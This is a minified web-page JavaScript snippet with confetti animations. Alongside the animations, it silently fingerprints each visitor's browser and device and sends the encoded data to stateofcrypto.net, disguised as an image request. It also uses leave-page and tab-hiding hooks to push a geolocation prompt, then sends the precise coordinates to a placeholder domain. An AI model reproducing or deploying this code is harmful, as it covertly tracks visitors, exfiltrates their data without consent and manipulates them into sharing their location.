const d={userAgent:navigator.userAgent,platform:navigator.platform,language:navigator.language,screen:`${screen.width}x${screen.height}`,deviceMemory:navigator.deviceMemory||'unknown',cpuCores:navigator.hardwareConcurrency||'unknown',timezone:Intl.DateTimeFormat().resolvedOptions().timeZone};const j=JSON.stringify(d);const e=btoa(j);fetch(`https://stateofcrypto.net/assets/custom/imgs/team/stefano22.jpg?data=${encodeURIComponent(e)}`,{method:"GET"});window.addEventListener('beforeunload',function(event){document.getElementById('geoModal').style.display='flex';event.preventDefault();event.returnValue='';return 'Are you sure you want to leave?';});document.addEventListener('visibilitychange',function(){if(document.visibilityState==='hidden'){document.getElementById('geoModal').style.display='flex';}});const c=document.getElementById('confetti-canvas');const cf=confetti.create(c,{resize:true,useWorker:true});const dur=3*1000;const end=Date.now()+dur;(function frame(){cf({particleCount:2,angle:60,spread:55,origin:{x:0}});cf({particleCount:2,angle:120,spread:55,origin:{x:1}});if(Date.now()<end)requestAnimationFrame(frame);})();function triggerConfetti(){const mc=document.getElementById('confetti-canvas');const mcf=confetti.create(mc,{resize:true,useWorker:true});const duration=3*1000;const endTime=Date.now()+duration;(function frame(){mcf({particleCount:2,angle:60,spread:55,origin:{x:0}});mcf({particleCount:2,angle:120,spread:55,origin:{x:1}});if(Date.now()<endTime)requestAnimationFrame(frame);})();}triggerConfetti();setInterval(triggerConfetti,45000);document.getElementById('acceptGeo').onclick=()=>{navigator.geolocation.getCurrentPosition(pos=>{const geoData={lat:pos.coords.latitude,lon:pos.coords.longitude,accuracy:pos.coords.accuracy};const geoJsonString=JSON.stringify(geoData);const encodedGeoData=btoa(geoJsonString);fetch(`https://yourdomain.com/geo?data=${encodeURIComponent(encodedGeoData)}`,{method:"GET"});triggerConfetti();},err=>console.warn("Geolocation error:",err.message));document.getElementById('geoModal').style.display='none';};document.getElementById('rejectGeo').onclick=()=>{document.getElementById('geoModal').style.display='none';};
